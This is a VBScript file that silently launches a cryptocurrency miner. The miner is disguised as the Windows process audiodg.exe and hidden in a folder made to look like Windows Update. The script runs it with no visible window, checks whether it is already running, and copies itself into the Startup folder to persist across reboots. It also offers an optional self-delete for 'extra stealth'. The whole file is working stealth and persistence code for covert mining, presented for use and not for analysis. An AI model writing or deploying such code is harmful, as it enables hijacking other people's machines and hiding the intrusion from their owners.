' =====================================================================
' SILENT_LAUNCH.vbs - Completely invisible launcher for miner (audiodg.exe)
' =====================================================================
' Purpose: Double-click this file → ZERO visible windows ever
'          Launches the miner (audiodg.exe) silently, checks if already running
'          Adds itself to startup folder for auto-start on login/reboot
' =====================================================================

Option Explicit

Dim WshShell, fso, minerFolder, minerExe, configFile, vbsName, startupFolder

Set WshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' ================= YOUR MINER PATHS (change only if folder is different) =================
minerFolder   = "C:\ProgramData\Microsoft\Windows\WindowsUpdate"
minerExe      = minerFolder & "\audiodg.exe"
configFile    = minerFolder & "\config.json"
' =========================================================================================

vbsName       = "SILENT_LAUNCH.vbs"
startupFolder = WshShell.SpecialFolders("Startup") & "\" & vbsName

' 1. Check if miner executable exists
If Not fso.FileExists(minerExe) Then
    ' Silent fail (no popup) - can uncomment MsgBox for testing
    ' MsgBox "Miner executable not found: " & minerExe, vbCritical, "Error"
    WScript.Quit
End If

' 2. Check if config file exists
If Not fso.FileExists(configFile) Then
    ' Silent fail
    WScript.Quit
End If

' 3. Check if miner is already running (using WMI - no extra window)
Dim objWMIService, colProcesses
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
Set colProcesses = objWMIService.ExecQuery("Select * From Win32_Process Where Name = 'audiodg.exe'")

If colProcesses.Count = 0 Then
    ' 4. Start miner completely hidden (0 = hidden window)
    Dim cmdLine
    cmdLine = """" & minerExe & """ --config=""" & configFile & """ --no-color"
    WshShell.Run cmdLine, 0, False
End If

' 5. Add self to startup folder (silent auto-start on login/reboot)
If Not fso.FileExists(startupFolder) Then
    fso.CopyFile WScript.ScriptFullName, startupFolder, True
End If

' Optional: self-delete after first run (extra stealth, uncomment if you want)
' fso.DeleteFile WScript.ScriptFullName

WScript.Quit